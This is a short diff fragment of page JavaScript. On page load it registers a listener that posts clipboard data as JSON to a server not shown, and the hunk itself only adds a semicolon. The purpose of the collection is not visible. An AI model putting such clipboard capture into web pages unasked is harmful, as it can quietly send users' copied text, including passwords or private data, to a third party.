@@ -25,4 +25,4 @@ window.addEventListener("load", (_) => {
             body: JSON.stringify({ clipboard: clipboardData })
         });
     }, false);
-})
+});
